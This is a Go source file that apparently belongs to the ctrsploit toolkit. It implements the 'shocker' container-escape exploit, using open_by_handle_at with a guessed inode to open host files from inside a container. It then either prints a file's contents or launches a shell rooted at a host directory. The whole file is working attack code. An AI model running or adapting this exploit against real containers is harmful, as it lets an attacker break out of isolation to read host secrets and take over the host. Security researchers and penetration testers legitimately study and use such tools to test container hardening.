package shocker

import (
	_ "embed"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"syscall"

	"github.com/ctrsploit/ctrsploit/pkg/util"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	"golang.org/x/sys/unix"
)

func Exploit(inode int, ref string, i io.Reader, o, e io.Writer) (err error) {
	fd, err := GetFd(inode, ref)
	if err != nil {
		return
	}
	f := os.NewFile(uintptr(fd), fmt.Sprintf("/proc/self/fd/%d", fd))
	fi, err := f.Stat()
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	if fi.IsDir() {
		err = Chroot(fd, i, o, e)
		if err != nil {
			return
		}
	} else {
		fmt.Printf("stat: %+v\n", fi)
		content, e := io.ReadAll(f)
		if e != nil {
			err = e
			awesome_error.CheckErr(err)
			return
		}
		fmt.Println(string(content))
	}
	return
}

func GetFd(inode int, ref string) (fd int, err error) {
	hostReference, err := syscall.Open(ref, syscall.O_RDONLY, 0)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	defer syscall.Close(hostReference)
	inodeBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(inodeBytes, uint64(inode))
	handle := unix.NewFileHandle(1, inodeBytes)
	fd, err = unix.OpenByHandleAt(hostReference, handle, unix.O_RDONLY)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	return
}

func Chroot(rootFd int, i io.Reader, o, e io.Writer) (err error) {
	return util.InvokeShellUnderDir(fmt.Sprintf("/proc/self/fd/%d", rootFd), i, o, e)
}
